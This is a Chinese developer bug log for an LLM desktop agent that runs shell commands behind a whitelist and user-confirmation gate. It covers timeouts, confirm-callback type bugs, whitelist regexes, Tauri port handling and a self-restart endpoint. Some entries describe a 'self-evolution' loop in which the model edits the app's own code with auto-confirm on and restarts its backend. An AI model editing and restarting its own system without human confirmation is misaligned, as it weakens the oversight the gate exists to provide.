  23:24:23.492 — confirm_id 不匹配，_pending_confirms 已空  # session 已被超时 pop
```

**根因**：
`src/lihua/server.py` L74: `_CONFIRM_TIMEOUT = 60.0` 太短。
用户读 confirm 内容 + 思考是否确认，60 秒经常不够。超时后 `confirm_cb` 返回 False，
`_pending_confirms` 中 pop 掉 session。用户后来点击确认时，POST `/api/chat/confirm`
找不到 confirm_id，返回 `ok:false`。但前端 v0.8.5 之前没给用户错误反馈，用户以为
确认已生效，看到"用户取消"非常困惑。

**解决方案**：
1. `src/lihua/server.py` L74: `_CONFIRM_TIMEOUT` 从 60.0 → 600.0（10 分钟）
2. `ConfirmCallback` 返回类型从 `bool` 改成 `str`：
   - `"confirmed"`：用户点击确认
   - `"denied"`：用户点击取消
   - `"timeout"`：超时未响应
3. `src/lihua/server.py` `_make_interactive_confirm_cb`：超时返回 `"timeout"`，用户取消返回 `"denied"`
4. `src/lihua/skill_runner.py` L406 + `src/lihua/agent.py` 4 处 confirm 调用方：
   根据 `"timeout"` 显示"确认超时（10 分钟内未响应）"，根据 `"denied"` 显示"用户取消"
5. `src/lihua/server.py` `/api/chat/confirm` 端点：confirm_id 过期时返回更明确的错误信息
   `"确认已超时（600s 内未响应），请重新发送指令"`（而不是 "confirm_id 不存在或已过期"）

**教训**：
- 硬编码超时要考虑用户思考时间——60 秒对人来说太短
- 超时和用户主动取消要区分——错误信息不同，用户处理方式也不同
- API 调用失败时前端必须给用户明确反馈（v0.8.5 修复了 handleConfirm，v0.8.6 修复了后端错误信息）

文件：`src/lihua/server.py`（`_CONFIRM_TIMEOUT`、`_make_interactive_confirm_cb`、`/api/chat/confirm`），
`src/lihua/skill_runner.py`（`ConfirmCallback`、L406 调用方），`src/lihua/agent.py`（`ConfirmCallback`、4 处调用方）

---

### T065: run_shell 默认 timeout 60s 对 apt install 太短

**现象**：
```
LLM 调用 run_shell 执行 sudo apt install gnome-tweaks，60 秒后超时失败。
后端日志显示 run_shell 多次 60.00s 超时。
```

**根因**：
- `src/lihua/agent.py` L361: `int(arguments.get("timeout", 60))`，LLM 不传 timeout 时默认 60s
- `src/lihua/skill_runner.py` L418: `300.0 if "install" in cmd else 60.0`，
  只检测 "install" 关键字，`apt update` / `git clone` / `make` 等长命令都是 60s

**解决方案**：
1. `src/lihua/agent.py` L361: 默认 timeout 60 → 300（5 分钟），上限 600 → 1800（30 分钟）
2. `src/lihua/skill_runner.py` L418: 扩大长命令关键字检测：
   - 长命令关键字：`install / update / upgrade / dist-upgrade / download / clone / build / make`
   - 长命令 timeout：300s → 600s（10 分钟）
   - 默认 timeout：60s → 120s（2 分钟）

**教训**：
- 默认超时要考虑最坏情况——apt install 在慢网络下 60s 不够
- 关键字检测要全面——只检测 "install" 漏掉了 update/clone/build 等长命令
- loop 检查很重要——同类 bug 一次修复，避免逐个发现

文件：`src/lihua/agent.py`（run_shell 的 timeout 默认值），
`src/lihua/skill_runner.py`（command/verify step 的 timeout 检测）

---

### T066: 非流式 /api/chat 端点 confirm_cb=None 导致灰名单操作失败

**现象**：
```
用户反馈"没看到确认弹窗。我同意"（lihua.log 中出现 2 次）
后端日志显示 5 次"需要确认但未提供确认回调"错误
```

**根因**：
- `src/lihua/server.py` L427（v0.8.6 及之前）：
  ```python
  confirm_cb = (lambda msg, cmd: req.auto_confirm) if req.auto_confirm else None
  ```
  两个 bug：
  1. `auto_confirm=True` 时 lambda 返回 bool `True`，但 `ConfirmCallback` 类型是 `Callable[[str, str], str]`，
     调用方用 `if decision != "confirmed"` 判断，`True != "confirmed"` 会被误判为取消
  2. `auto_confirm=False`（默认）时 `confirm_cb = None`，灰名单操作触发 `if confirm is None: return "需要确认但未提供确认回调"`
- 非流式接口没有 SSE 流，无法推送 needs_confirm 事件给前端，所以原生不支持交互式 confirm
- 前端 App.tsx L196 用 `api.chatStream` 走 `/api/chat/stream`，没触发此 bug，但非流式接口仍是潜在隐患

**解决方案（v0.8.7）**：
```python
# src/lihua/server.py L426-440
if req.auto_confirm:
    confirm_cb = lambda msg, cmd: "confirmed"  # 类型一致：返回 str
else:
    def confirm_cb(msg: str, cmd: str) -> str:
        log.warning(f"非流式 /api/chat 不支持交互式 confirm，拒绝灰名单操作：{cmd[:80]}")
        return "denied"  # 明确拒绝，让 LLM 知道命令没执行
```

**教训**：
- ConfirmCallback 类型从 bool 改 str 时（v0.8.6），要检查所有调用方——非流式端点的 lambda 漏改
- 非流式接口和流式接口的 confirm 机制天然不同——流式有 SSE 推 needs_confirm 事件，非流式没有
- 文档化：非流式 /api/chat 不支持交互式 confirm，需要 confirm 的操作必须用 /api/chat/stream

文件：`src/lihua/server.py`（L426-440 非流式 chat 端点 confirm_cb 修复）

---

### T067: dmesg/w/id 等只读诊断命令被分到 unknown 走 confirm 挡路

**现象**：
```
LLM 诊断问题时调 dmesg / w / id / who / last 等只读命令，
被 safety.py 分类为 unknown（默认按灰名单处理），走 confirm 弹窗挡路。
用户目标"让 LLM 流畅操控 Linux 自我诊断"被卡住。
```

**根因**：
- `src/lihua/safety.py` 白名单只覆盖了 ls/cat/grep/find/ps/df 等常见只读命令
- 漏掉了诊断场景常用的只读命令：dmesg（内核日志）/ w/who（登录用户）/ id（用户身份）/ last（登录记录）/ type/alias/history（shell 信息）
- 这些命令在 LLM 自我诊断 / 系统诊断场景高频使用，被分到 unknown 走 confirm 增加无谓摩擦

**解决方案（v0.8.7）**：
`src/lihua/safety.py` L506-515 白名单新增 9 个只读诊断命令：
```python
(r"\bdmesg\b(?:\s|$)", "查看内核日志"),
(r"\bw\b\s*$", "查看登录用户"),
(r"\bwho\b\s*$", "查看登录用户"),
(r"\bid\b\s*$", "查看当前用户身份"),
(r"\bid\b\s+\S+", "查看指定用户身份"),
(r"\blast\b(?:\s|$)", "查看最近登录记录"),
(r"\btype\b\s+", "查看命令类型"),
(r"\balias\b\s*$", "查看命令别名"),
(r"\bhistory\b(?:\s|$)", "查看 shell 历史"),
```

**教训**：
- 白名单要从 LLM 实际使用场景倒推——诊断场景需要哪些只读命令
- 安全引擎的"未知默认灰名单"策略偏保守，对 LLM 自我诊断场景是阻力
- loop 检查白名单覆盖度：诊断 / 文件查看 / 进程查询 / 网络查询 / 用户查询 / 系统信息 等场景

文件：`src/lihua/safety.py`（L506-515 白名单新增 9 个只读诊断命令）

---

### T068: nvidia-smi / blkid 等诊断命令白名单正则太严格

**现象**：
```
LLM 诊断 GPU 问题时调 nvidia-smi，被分类为 unknown（默认灰名单），走 confirm 挡路。
LLM 查磁盘信息时调 blkid /dev/nvme0n1p1，被分类为 unknown，走 confirm 挡路。
日志显示：
  {"command": "nvidia-smi", "safety": "unknown"}
  {"command": "blkid /dev/nvme0n1p1", "safety": "unknown"}
```

**根因**：
- `src/lihua/safety.py` 白名单完全没有 nvidia-smi / glxinfo / vainfo / vulkaninfo / drm_info / lscpu / lsblk / lsmod 等 GPU/图形/系统诊断命令
- `blkid` 白名单正则 `\bblkid\b\s*$` 只匹配裸 blkid（无参数），带参数 `blkid /dev/sdX` 不匹配

**解决方案（v0.8.7）**：
1. `blkid` 正则改为 `\bblkid\b(?:\s|$)` 支持带参数
2. 白名单新增 GPU/图形/显示诊断命令：
   ```python
   (r"\bnvidia-smi\b(?:\s|$)", "查看 NVIDIA GPU 状态"),
   (r"\bglxinfo\b(?:\s|$)", "查看 OpenGL 信息"),
   (r"\bvainfo\b(?:\s|$)", "查看视频加速信息"),
   (r"\bvulkaninfo\b(?:\s|$)", "查看 Vulkan 信息"),
   (r"\bdrm_info\b(?:\s|$)", "查看 DRM 信息"),
   (r"\bxrandr\b(?:\s+(?:--query|--current|--listmonitors|--verbose|--prop|--screen|--q1|--q12))?\s*$", "查看屏幕信息"),
   (r"\blscpu\b(?:\s|$)", "查看 CPU 信息"),
   (r"\blsblk\b(?:\s|$)", "查看块设备"),
   (r"\blsmod\b(?:\s|$)", "查看内核模块"),
   (r"\bdbus-send\b.*--print-reply", "D-Bus 查询"),
   (r"\bgdbus\b.*--introspect", "D-Bus 内省"),
   ```
3. xrandr 只匹配只读子命令（--query/--current 等），修改类子命令（--output xxx --off）走 grey

**教训**：
- 白名单正则 `\s*$` 只匹配裸命令，带参数需用 `(?:\s|$)` 支持参数后缀
- 诊断命令要按场景分组覆盖：GPU/图形/显示/磁盘/CPU/内核模块/D-Bus
- xrandr 这类"既能查又能改"的命令要区分只读子命令和修改子命令

文件：`src/lihua/safety.py`（L602-622 GPU/图形/显示诊断命令白名单 + blkid 正则修复）

---

### T069: 桌面端启动时旧后端占用端口导致新后端不生效

**现象**：
```
桌面端 v0.8.7 启动后，curl /api/health 显示版本仍是 v0.8.6a0（旧后端）。
ps 显示旧后端 PID 662585（7月20启动），新后端没启动。
所有 v0.8.7 的修复（白名单 / read_log / confirm_cb）都没生效。
```

**根因**：
- `desktop/src-tauri/src/lib.rs` 的 `start_backend` 直接 spawn uvicorn 子进程
- `wait_for_port` 只检测端口可连接，不检测是不是自己启动的进程
- 旧后端占用 7531 端口时，新后端 spawn 后 uvicorn 因端口冲突立即退出
- 但 `wait_for_port` 检测到端口可连接（旧后端在监听），以为新后端就绪
- 桌面端连到旧后端，所有新代码不生效

**解决方案（v0.8.7）**：
`start_backend` 函数新增端口占用检测逻辑（L78-107）：
```rust
// 启动前先检测端口是否被占用
if std::net::TcpStream::connect((BACKEND_HOST, BACKEND_PORT)).is_ok() {
    log::warn!("端口 {} 被旧后端占用，尝试清理...", BACKEND_PORT);
    // 优先用 fuser -k PORT/tcp（精准 kill 占用端口的进程）
    let _ = Command::new("fuser").arg("-k").arg(format!("{}/tcp", BACKEND_PORT)).output();
    // 兜底用 pkill -f "uvicorn.*PORT"
    let _ = Command::new("pkill").arg("-f").arg(format!("uvicorn.*{}", BACKEND_PORT)).output();
    // 等待端口释放（最多 3 秒）
    let deadline = Instant::now() + Duration::from_secs(3);
    while Instant::now() < deadline {
        if std::net::TcpStream::connect((BACKEND_HOST, BACKEND_PORT)).is_err() {
            break;
        }
        std::thread::sleep(Duration::from_millis(200));
    }
    log::info!("旧后端已清理，启动新后端");
}
```

**教训**：
- `wait_for_port` 只检测端口可连接，不区分"自己启动的进程"和"旧进程"——这是 sidecar 模式的经典坑
- sidecar 启动前必须先清理可能占用端口的旧进程
- `fuser -k PORT/tcp` 是 Linux 下精准 kill 占用端口进程的标准命令
- `pkill -f` 作为兜底（fuser 不存在时）

文件：`desktop/src-tauri/src/lib.rs`（L78-107 start_backend 端口占用检测）

---

### T070: _make_interactive_confirm_cb 中 log 变量未定义（confirm 超时抛 NameError）

**现象**：
```
日志显示：[ERROR] 流式 Agent 异常：name 'log' is not defined
用户反馈：确认执行的弹窗 GUI 老是跳出不来，等待时间结束了才跳出来并且报超时。
```

**根因**：
- `src/lihua/server.py` L110-163 的 `_make_interactive_confirm_cb` 是模块级函数
- L160 `log.warning(f"confirm 超时...")` 使用了 `log` 变量
- 但 `log` 变量只在 `create_app` 函数内部（L283）定义：`log = get_logger(__name__)`
- 模块级函数访问不到 `create_app` 的局部变量 `log`
- confirm 超时（600s）时 L160 抛 `NameError: name 'log' is not defined`
- NameError 传播到 `_execute_run_shell` → `run_agent_streaming` → `run_in_thread`
- 子线程异常退出，主线程检测到 `error_holder[0]`，yield error 事件
- 用户看到"Agent 异常：name 'log' is not defined"

**解决方案（v0.8.8）**：
`_make_interactive_confirm_cb` 函数内部获取 logger：
```python
def _make_interactive_confirm_cb(event_queue):
    import queue as _queue
    from lihua.logging_config import get_logger
    _log = get_logger(__name__)  # 函数内部获取 logger

    def cb(msg, cmd):
        ...
        # 超时分支
        _log.warning(f"confirm 超时（{_CONFIRM_TIMEOUT}s）：confirm_id={confirm_id[:8]}...")
        return "timeout"
    return cb
```

**教训**：
- Python 闭包访问外层函数的局部变量，但模块级函数访问不到其他函数的局部变量
- 模块级函数需要 logger 时，必须在函数内部获取（`get_logger(__name__)`），不能依赖外层定义
- `log` 是常见变量名，容易在重构时遗漏作用域问题——模块级函数统一用 `get_logger` 获取
- NameError 在子线程抛出时会被 `except Exception` 捕获，但会导致整个 Agent 流异常终止

文件：`src/lihua/server.py`（L138-140 `_make_interactive_confirm_cb` 内部获取 logger）

---

### T071: confirm 返回值覆盖 decision 变量导致 'str' has no attribute 'level'

**现象**：
```
用户点击确认后，后端日志显示：
  Agent 异常: 'str' object has no attribute 'level'
SSE 流推送 error 事件，Agent 流异常终止。
用户看到"Agent 异常"错误，命令没执行。
```

**根因**：
`src/lihua/agent.py` `_execute_run_shell` 中变量覆盖 bug：
```python
decision = classify(cmd)  # decision 是 SafetyDecision 对象
if decision.level == "grey":
    ...
    decision = confirm(msg, cmd)  # ← decision 被覆盖成字符串 "confirmed"/"denied"/"timeout"
    if decision != "confirmed":
        ...

# 后续代码仍然按 SafetyDecision 对象访问
log.info(..., extra={
    "safety": decision.level,  # ← 'str' object has no attribute 'level'
    ...
})
```

`confirm()` 返回字符串（"confirmed"/"denied"/"timeout"），但 L462 把它赋给了 `decision` 变量，
覆盖了原来的 SafetyDecision 对象。后续 L492 `decision.level` 访问字符串的 `.level` 属性报错。

**解决方案（v0.8.8）**：
所有 5 处 confirm 调用点统一用 `confirm_decision` 变量名，避免覆盖 `decision`：
1. `agent.py` `_execute_run_shell` L462（有 `.level` bug）
2. `agent.py` `_execute_run_python` L631（无 `.level` 访问，但统一改名）
3. `agent.py` `_execute_write_file` L1139（同上）
4. `agent.py` `_execute_edit_file` L1322（同上）
5. `skill_runner.py` L406（同上）

```python
confirm_decision = confirm(msg, cmd)  # 不再覆盖 decision
if confirm_decision != "confirmed":
    is_timeout = confirm_decision == "timeout"
    ...
```

**教训**：
- 变量命名要避免覆盖：`decision`（SafetyDecision 对象）和 `confirm_decision`（字符串）语义不同，不能混用
- v0.8.6 把 ConfirmCallback 返回类型从 bool 改成 str 时，没有检查所有调用点的变量覆盖问题
- 这种 bug 在"用户点击确认"路径才触发，开发和测试时容易遗漏（dry_run 路径不走 confirm）
- 修复时要 loop 检查所有 confirm 调用点，不能只修一个

文件：`src/lihua/agent.py`（4 处 confirm 调用）+ `src/lihua/skill_runner.py`（1 处 confirm 调用）

---

### T072: self_restart 脚本里 Python f-string 误用 time.time()

**现象**：
v0.8.9 实现 `/api/self/restart` 接口时，重启脚本用 Python f-string 生成：
```python
restart_script = f"""#!/bin/bash
sleep 1
pkill -f "uvicorn.*lihua.server" 2>/dev/null
sleep 2
nohup {python_bin} -m uvicorn ... &
echo '{{"status": "done", "new_pid": "$!", "finished_at": {time.time()}}}' > {_RESTART_STATUS_FILE}
"""
```
运行时报 `NameError: name 'time' is not defined`——函数内 `import time as _time`，但 f-string 里用的是 `time.time()`（不是 `_time.time()`）。

**根因**：
1. 函数内 `import time as _time`，f-string 里写 `{time.time()}` 访问的是 `time`（未定义）而非 `_time`
2. 更深层问题：`time.time()` 在 Python 生成脚本时就被固化成时间戳，不是脚本执行时的时间。重启脚本 3 秒后才执行到 echo 行，时间戳会差 3 秒

**解决方案**：
让 bash 脚本自己用 `date +%s` 生成时间戳，不依赖 Python：
```python
restart_script = f"""#!/bin/bash
sleep 1
pkill -f "uvicorn.*lihua.server" 2>/dev/null
sleep 2
nohup {python_bin} -m uvicorn ... &
new_pid=$!
cat > {_RESTART_STATUS_FILE} << EOF
{{"status": "done", "new_pid": "$new_pid", "finished_at": $(date +%s)}}
EOF
"""
```

**教训**：
- Python f-string 生成 bash 脚本时，时间戳不要用 Python 的 `time.time()`（生成时固化），让 bash 用 `$(date +%s)`（执行时生成）
- f-string 里 `import xxx as yyy` 后，`{xxx}` 和 `{yyy}` 是不同的变量名，容易写错
- 用 heredoc（`cat > file << EOF`）代替 `echo` 写 JSON，避免引号转义地狱

文件：`src/lihua/server.py` 的 `self_restart` 接口

---

### T073: 后端自重启与桌面端 Tauri 的进程关系

**现象**：
v0.8.9 实现 self_restart 时，需要理解后端自重启后桌面端 Tauri 的行为：
- 桌面端 Tauri 启动后端时，后端是 Tauri 的子进程（`Command::new(python).spawn()`）
- Tauri 持有子进程句柄 `BackendHandle(Mutex<Option<Child>>)`
- self_restart 用 `pkill -f "uvicorn.*lihua.server"` kill 旧后端后，Tauri 持有的子进程句柄变成僵尸态

**根因**：
Tauri 的 `start_backend` 只在 app 启动时调一次，没有"后端死了重新拉起"的逻辑。
但新后端是重启脚本 spawn 的独立进程（不是 Tauri 的子进程），监听 7531 端口。
桌面端前端通过 HTTP 连接新后端，功能正常。
退出时 Tauri 会尝试 kill 旧子进程（已死），不影响。

**解决方案**：
self_restart 接口 spawn detached 重启脚本（`start_new_session=True`），脚本：
1. `sleep 1` 让接口响应先发出
2. `pkill -f "uvicorn.*lihua.server"` kill 旧后端
3. `sleep 2` 等端口释放
4. `nohup uvicorn ... &` spawn 新后端

新后端不是 Tauri 的子进程，但 Tauri 前端通过 HTTP 连接新后端，功能正常。
Tauri 持有的旧子进程句柄变成僵尸态，退出时 Tauri 尝试 kill 已死进程，无副作用。

**教训**：
- 自重启后端时，新后端不是父进程的子进程，父进程（Tauri）持有的旧句柄会变成僵尸态
- 但只要新后端监听相同端口，前端 HTTP 通信不受影响
- 用 `start_new_session=True` 让重启脚本 detached，不依赖当前进程

文件：`src/lihua/server.py` 的 `self_restart` 接口 + `desktop/src-tauri/src/lib.rs` 的 `start_backend`

---

### T074: SSE 流接口 auto_confirm=True 时 confirm_cb 返回 True（bool）被误判为取消

**现象**：
v0.8.9 LLM 自进化闭环测试时，LLM 调 edit_file 改代码，auto_confirm=True 模式下 edit_file 返回"❌ 用户取消了编辑"，代码未被修改。
LLM 回复："看起来你取消了编辑操作（弹窗点了取消）"——但实际没有弹窗（auto_confirm=True 应该自动通过）。

**根因**：
v0.8.6 把 `ConfirmCallback` 返回类型从 `bool` 改成 `str`（`"confirmed" / "denied" / "timeout"`），但只修了非流式接口（L443-444），漏了流式接口（L519）：

```python
# server.py L518-519（bug 代码）
if req.auto_confirm:
    confirm_cb = lambda msg, cmd: True  # ← 返回 bool True
```

agent.py 的 `_execute_write_file` / `_execute_edit_file` 用 `if confirm_decision != "confirmed"` 判断：
- `True != "confirmed"` → 被误判为取消！

非流式接口 L443-444 已正确修复（注释里还写了原因）：
```python
if req.auto_confirm:
    confirm_cb = lambda msg, cmd: "confirmed"  # 正确
```

**解决方案**：
流式接口 L519 改为返回 `"confirmed"`：
```python
if req.auto_confirm:
    confirm_cb = lambda msg, cmd: "confirmed"
```

**验证**：
- 修复前：LLM 调 edit_file → "❌ 用户取消了编辑" → 代码未改
- 修复后：LLM 调 edit_file → "✅ 已编辑" → 代码改成功 → self_restart → health 接口返回新字段

**教训**：
- v0.8.6 改返回类型时应该用 grep 搜所有 `confirm_cb` 定义点，不能只改一个
- 这种 bug 在 auto_confirm=True 模式才触发（交互式 confirm 不受影响），开发和测试时容易遗漏
- 非 LLM 路径（skill_runner / run_shell）不经过这个 confirm_cb，所以日常使用没暴露
- 回归测试要覆盖 auto_confirm=True + edit_file/write_file 组合

文件：`src/lihua/server.py` L518-523

---

### T075: self_restart 后 SSE 流提前断开——重启脚本 sleep 太短

**现象**：
v0.8.9 LLM 自进化闭环测试时，LLM 调 self_restart 后，SSE 流在前端显示"连接失败"错误，而不是正常显示 LLM 的"重启已触发"回复。
时间线：
1. LLM 调 self_restart 工具
2. `_execute_self_restart` 调 `/api/self/restart` 接口
3. 接口 spawn 重启脚本（`sleep 1 && pkill ...`），立即返回
4. self_restart 工具返回 `success=True`
5. Agent 把工具结果发给 LLM，LLM 生成回复（约 2-3 秒）
6. **1 秒后**重启脚本 kill 后端，SSE 流断开
7. 前端 `for await (const event of api.chatStream(...))` 抛异常，显示"连接失败"

**根因**：
重启脚本的 `sleep 1` 太短——LLM 生成回复 + SSE 流推送 done 事件需要 2-3 秒，但 1 秒后后端就被 kill 了。
SSE 流在 `done` 事件发出前断开，前端 catch 块显示"连接失败"而非正常结束。

**解决方案**：
把重启脚本的 sleep 从 1s 延长到 5s，给 LLM 充足时间生成回复 + 推送 done 事件：
```python
restart_script = f"""#!/bin/bash
sleep 5          # 旧值 1s → 新值 5s，让 LLM 完成 SSE 流
pkill -f "uvicorn.*lihua.server" 2>/dev/null
sleep 3          # 旧值 2s → 新值 3s，等端口释放
nohup {python_bin} -m uvicorn ... &
"""
```

同步更新所有用户可见的消息（"约 3 秒"→"约 8 秒"）：
- agent.py system prompt
- agent.py `_execute_self_restart` 的 dry_run / confirm / success 消息

**验证**：
- 修复前：self_restart 后 SSE 流断开，前端显示"连接失败"
- 修复后：self_restart 后 SSE 流正常收到 done 事件（15.7s 调 self_restart → 18.6s 收到 done），新后端 8 秒后就绪

**教训**：
- 自重启接口的 sleep 时间要 > LLM 生成回复的时间（约 2-3 秒），留足余量
- SSE 流断开时前端 catch 块要区分"正常重启断开"和"真实连接失败"，但最简方案是让 sleep 足够长
- 状态同步问题（goal 第 1 条）不只是数据同步，还包括"异步操作（重启）与同步流程（SSE）的时序协调"

文件：`src/lihua/server.py` L1066-1069（重启脚本）+ `src/lihua/agent.py` L136/2150/2165/2191（消息文本）

---

### T076: ToolCallRecord 没有 duration 字段，写新的 _execute_* 函数时易混淆

**现象**：
v0.8.15 二次进化第五支柱 self_analyze 工具 LLM 端到端验证时，POST /api/chat 返回 `Internal Server Error`，后端日志报：
```
TypeError: ToolCallRecord.__init__() got an unexpected keyword argument 'duration'
```
LLM 已经成功调用 self_analyze 工具，但 `_execute_self_analyze` 返回 ToolCallRecord 时报错。

**根因**：
`agent.py` 里的 3 个核心数据类字段不一致：
- `ToolCallRecord`（L261）：tool_name / arguments / success / result_message / result_details / error——**没有 duration**
- `AuditEntry`：有 duration 字段
- `MemoryEpisode`：有 duration 字段

写 `_execute_self_analyze` 时按惯例加了 `duration=elapsed`，但 ToolCallRecord 不支持。
而且 agent.py L801（AuditEntry）、L2986（MemoryEpisode）确实都用了 `duration=`，更易让人误以为 ToolCallRecord 也有。

**解决方案**：
1. 移除 `_execute_self_analyze` 里的 `duration=elapsed` 参数
2. 同时移除不再需要的 `t0` 参数和 `import time as _time`（self_analyze 是只读分析工具，不需要计时）
3. 调用方 `_execute_tool` 也同步移除 `import time as _t; _t.perf_counter()`

```python
# 修复前
def _execute_self_analyze(arguments, on_progress, dry_run, t0):
    import time as _time
    ...
    elapsed = _time.perf_counter() - t0
    return ToolCallRecord(..., duration=elapsed)

# 修复后
def _execute_self_analyze(arguments, on_progress, dry_run):
    ...
    return ToolCallRecord(...)
```

**验证**：
- 修复前：POST /api/chat → 500 Internal Server Error
- 修复后：POST /api/chat → LLM 成功调 self_analyze，返回完整分析报告

**教训**：
- 写新的 `_execute_*` 函数前先核对 ToolCallRecord 的字段（不要按 AuditEntry / MemoryEpisode 的惯例写）
- 后续可考虑给 ToolCallRecord 加 duration 字段统一三个数据类（暂未做，避免影响其他调用点）

文件：`src/lihua/agent.py` L261（ToolCallRecord 定义）+ L2612-2661（_execute_self_analyze）+ L360-362（_execute_tool 调度）

---

## T077：server.py Body 未导入导致后端启动失败（v0.8.17 引入，v0.8.18 修复）

**现象**：
- v0.8.17 重启后端后，curl 访问任意接口返回"连接被拒绝"
- 后端进程不存在（/api/self/restart 无法访问）
- 日志无输出（进程根本没起来）

**根因**：
- `src/lihua/server.py` L1423 `def memory_archive(body: dict | None = Body(None))` 用了 `Body` 但没导入
- `create_app()` 函数顶部 `from fastapi import FastAPI, HTTPException`（L284）没包含 `Body`
- Python 在函数定义时求值默认值表达式 `Body(None)` → NameError: name 'Body' is not defined
- `create_app()` 抛异常 → uvicorn 启动失败 → 后端进程退出

**解决方案**：
- `src/lihua/server.py` L284 改为 `from fastapi import Body, FastAPI, HTTPException`

```python
# 修复前
def create_app() -> Any:
    from fastapi import FastAPI, HTTPException
    ...

# 修复后
def create_app() -> Any:
    from fastapi import Body, FastAPI, HTTPException
    ...
```

**验证**：
- 修复前：`curl http://127.0.0.1:7531/api/health` → 连接被拒绝
- 修复后：`curl http://127.0.0.1:7531/api/health` → 返回 `{"ok":true,"version":"0.8.18a0",...}`

**教训**：
- 用 FastAPI 的 `Body` 装饰器必须导入（`from fastapi import Body`）
- 后端启动失败时先检查 `/api/health` 是否能访问，连接被拒绝说明进程没起来
- v0.8.17 引入这个 bug 后，当时 /api/memory/archive 测试能通过是因为旧后端进程还在运行（新后端启动失败但旧进程未被杀），后来旧进程退出后问题暴露
- 写新接口用 `body: dict | None = Body(None)` 时，确认 Body 已在 `create_app()` 内导入

文件：`src/lihua/server.py` L284（create_app 导入）+ L1423/1485/1509（用 Body 的接口）

---

### T078: Tauri 2.0 WebviewWindow 没有 toggle_maximize 方法

**现象**：
```
error[E0599]: no method named `toggle_maximize` found for struct `tauri::WebviewWindow<R>` in the current scope
   --> src/lib.rs:324:21
    |
324 |         let _ = win.toggle_maximize();
    |                     ^^^^^^^^^^^^^^^
    |
help: there is a method `maximize` with a similar name
```

**根因**：
Tauri 2.x 的 `WebviewWindow` 没有 `toggle_maximize()` 方法（与某些文档/示例不一致）。
只有 `maximize()` / `unmaximize()` / `is_maximized()` 三个方法，需手动判断后调用。

**解决方案**：
手动判断 + 切换：
```rust
#[tauri::command]
fn cmd_toggle_maximize(app: AppHandle) {
    if let Some(win) = main_window(&app) {
        if win.is_maximized().unwrap_or(false) {
            let _ = win.unmaximize();
        } else {
            let _ = win.maximize();
        }
    }
}
```

**验证**：
- 修复前：`cargo check` 报 E0599 no method named `toggle_maximize`
- 修复后：`cargo check` 通过

**教训**：
- Tauri 2.x API 与 1.x 有差异，写代码前用 `cargo doc --open` 或查官方 API docs 确认方法存在
- 编译器建议的 `maximize` 不是 `toggle_maximize` 的等价替代（maximize 只会最大化不会还原），要自己组合 is_maximized + maximize/unmaximize

文件：`desktop/src-tauri/src/lib.rs` L320-L330

---

### T079: ModelSheet 下拉选项选不上——mousedown 事件在 Tauri WebView 下误关闭 Portal 下拉

**现象**：
ModelSheet 模型下拉菜单中，点击非默认选项（如 GLM-4.7-Flash）时下拉菜单立即关闭，选中仍为默认模型（GLM-5.2）。用户报告"除了 5.2 其他根本选不上，因为一点击，选择界面就退出了"。

**根因**：
`desktop/src/components/ModelSheet.tsx` L132-144 的 mousedown 监听器：
```javascript
window.addEventListener('mousedown', onClick)
// onClick 检查 modelDropdownListRef.current?.contains(target)
```
mousedown 事件在 click 之前触发。当用户点击下拉列表项时，mousedown 先冒泡到 window，处理器检查 `modelDropdownListRef.current?.contains(target)`。在 Tauri WebView（WebKitGTK）环境下，Portal 渲染的 DOM ref 可能存在 timing 问题导致 `contains()` 返回 false（`!inList` = true），下拉被误关闭。后续 click 的 `onClick`（`setSelectedModelId`）无法执行，因为下拉已 unmount。

同时 L150 的 scroll 监听器用了捕获模式（`addEventListener('scroll', onClose, true)`），下拉列表内部滚动也会触发关闭。

**解决方案**：
1. 下拉列表项加 `onMouseDown={e => e.stopPropagation()}` 阻止 mousedown 冒泡到 window：
```jsx
<button
  onMouseDown={e => e.stopPropagation()}
  onClick={() => { setSelectedModelId(model.id); setModelDropdownOpen(false) }}
>
```
2. scroll 监听器从捕获改冒泡（`true` → `false`），避免内部滚动误关闭：
```javascript
window.addEventListener('scroll', onClose, false)
```

**验证**：
- 修复前：点击非默认选项下拉立即关闭，选中不变
- 修复后：点击任意选项正常选中，下拉正常关闭

**教训**：
- Tauri WebView（WebKitGTK）的事件 timing 与标准浏览器有差异，Portal 的 ref 在 mousedown 时可能尚未就绪
- mousedown/click 事件竞争是 Portal 下拉菜单的常见陷阱：用 `onMouseDown stopPropagation` 确保 click 的 onClick 能正常执行
- scroll 监听器用捕获模式（true）会捕获子元素的 scroll 事件，下拉列表内部滚动应用冒泡模式（false）

文件：`desktop/src/components/ModelSheet.tsx` L132-158, L498-505

---

### T080：cargo build --release 不会更新 Tauri 前端资源（必须用 npx tauri build --no-bundle）

**现象**：修改前端代码（api.ts / App.tsx）后运行 `cargo build --release`，编译成功（19s），二进制时间戳更新了，但运行应用发现前端行为没变（Connection refused 修复未生效）。检查 `target/release/build/lihua-desktop-*/out/tauri-codegen-assets/` 目录发现 JS 文件时间戳是几天前的旧文件。

**根因**：
- `cargo build --release` 只编译 Rust 代码，**不会触发 `beforeBuildCommand`（npm run build）**
- `tauri_build::build()` 在 `build.rs` 中生成的 `tauri-codegen-assets` 依赖 `rerun-if-changed` 指令，但该指令**没有正确指向 dist 目录的文件内容变化**（只检测目录是否存在，不检测文件内容 hash）
- `tauri::generate_context!()` 宏在编译时读取 codegen-assets 嵌入到二进制中——如果 codegen-assets 没更新，嵌入的就是旧前端代码
- `touch build.rs` 或 `touch lib.rs` 虽然能触发重新编译，但 `tauri_build::build()` 仍然检测到 dist 目录"没变"（因为 rerun-if-changed 的粒度问题），不重新生成 codegen-assets
- `cargo clean -p lihua-desktop` 清理了二进制，但 cargo 的 fingerprint 仍认为 build.rs 不需要重新运行（0.15s 编译完成）

**解决方案**：
- **必须用 `npx tauri build --no-bundle`**（或 `lihua gui --build`），它会：
  1. 先运行 `beforeBuildCommand`（`tsc -b && vite build`）生成最新 dist/
  2. 然后通过 `tauri build` 命令正确触发 build.rs 重新生成 codegen-assets
  3. 编译 Rust 二进制（嵌入最新前端资源）
- `--no-bundle` 跳过 deb/appimage 打包（只需要二进制）
- 验证方法：检查二进制文件大小是否变化（新前端资源会导致大小变化）；检查 `tauri-codegen-assets` 目录时间戳是否更新
- `cli.py` 的 `_build_tauri()` 函数注释已写明这一点（L810-816），但容易被忽略
- **v0.8.24 起不再依赖用户手动编译**：`lihua gui` 启动前自动调 `_check_binary_ready()` 自检（见 T081），检测到源码过期/版本不匹配时自动 `npx tauri build --no-bundle`，用户零编译零命令行

